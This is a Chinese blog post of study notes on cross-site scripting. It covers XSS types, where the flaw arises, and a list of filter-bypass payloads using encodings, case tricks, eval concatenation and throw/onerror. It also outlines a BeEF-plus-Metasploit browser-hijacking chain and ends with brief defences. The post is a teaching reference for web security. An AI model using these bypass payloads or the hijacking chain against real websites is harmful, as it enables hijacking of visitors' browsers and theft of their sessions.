---
title: XSS 跨站脚本攻击
published: 2025-03-09 16:44:04
tags: [WEB安全,通用漏洞]
category: 安全
draft: false
---

# XSS 跨站脚本攻击

## 原理

[XSS漏洞原理、分类、危害及防御_xss的危害及防御方法-CSDN博客](https://blog.csdn.net/rendaa/article/details/113592738)

[网络安全自学篇（十八）| XSS跨站脚本攻击原理及代码攻防演示（一）-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1612474)

[XSS总结 - 先知社区](https://xz.aliyun.com/t/4067?time__1311=n4%2Bxni0QG%3DoCqAKYiKDsD7feynmUdeHedDB7rYD)

## 分类

反射型，存储型，DOM型（前三种常用）,mXSS

## 一般会在哪产生

数据交互的地方（数据是由你来操控的），留言板，评论，文章发布，文章显示

## 玩法

`PDFXSS`：`https://blog.csdn.net/m0_73236215/article/details/131646018`

`XSS`后台植入&`Cookie`&表单劫持：`XSS后台植入CSDN` | `权限维持，钓鱼` |

浏览器劫持：（思路）使用XSS-beef 构造 XSS后门 放到可信任的网站上→别人点击后在在beef上线→beef里面操控浏览器访问地址（到这步就是劫持了）→ （再搭配msf来获取shell权限）msf 生成后门url→然后beef操控浏览器访问  

## 绕过姿势

### 单引号双引号反引号

html标签中，我们**可以不用引号**；如果是在javascript的函数中，我们可以用反引号代替单双引号

```python
<img src="1" onerror=alert(1);>可以，
<img src=`1` onerror=alert(1);>不行；

<img src="1" onerror='alert(1)';>可以，
	<img src="1" onerror=`alert(1)`;>不行；

<img src="x" onerror=alert('1');>可以，
<img src="x" onerror=alert(`1`);>可以；
```

### 空格被过滤

使用/代替空格

```python
<img/src="1"/onerror=alert(1);>
```

用回车符CR(%0d) 和换行符LF(%0a)取代空格,在HTML中`%0a`和`%0d`是可以当成空格使用的。

```python
<img%0asrc='1'%0donerror=alert(1);>
```

### 关键字被过滤

- 用`<svg>`标签等
- 指示符干扰绕过
    
    `<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>`
    
- 大小写绕过
    
    ```python
    <ImG sRc=1 onerRor=alert(1);>
    <SvG OnlOad="alert(1)">
    ```
    
- 双写绕过
    
    `<imimgg srsrcc=x onerror=alert("xss");>` 得看准确配置，有的过滤只能替换一次
    
- 字符拼接
    
    eval以及top
    
    ```python
    <img src="x" onerror="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">
    <svg onload="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">
    //
    <script>top[`al`+`ert`](1);</script>
    <img src="x" onerror="top['al'+'ert'](1);">
    <svg onload='top["al"+"ert"](1);'>
    ```
    
- 其他字符混淆
- 编码绕过
    
    HTML编码，Unicode编码
    
    escape 编码
    
    ```python
    <img src="a" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
    ```
    
    ASCII编码
    
    ```python
    <img src="b" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
    ```
    
    十六进制编码`\x`的`x`只能小写
    
    ```python
    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
    ```
    
    八进制编码
    
    ```python
    <script>eval("\141\154\145\162\164\50\57\170\163\163\57\51");</script> 
    ```
    
    base64，使用atob解码
    
    ```python
    <img src="c" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
    
    <iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>
    ```
    
- 括号被过滤
    
    使用`throw`
    
    设置错误处理程序为`eval`然后`throw`抛出错误`eval`执行`alert`
    
    ```python
    <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
    ```
    

## 如何防护

1、过滤一些危险字符，以及转义`&<>" '`等危险字符

2、`HTTP-only Cookie` ,防止`xss`盗取`cookie`

3、设置`CSP(Content Security Policy)`，设置资源只能本地加载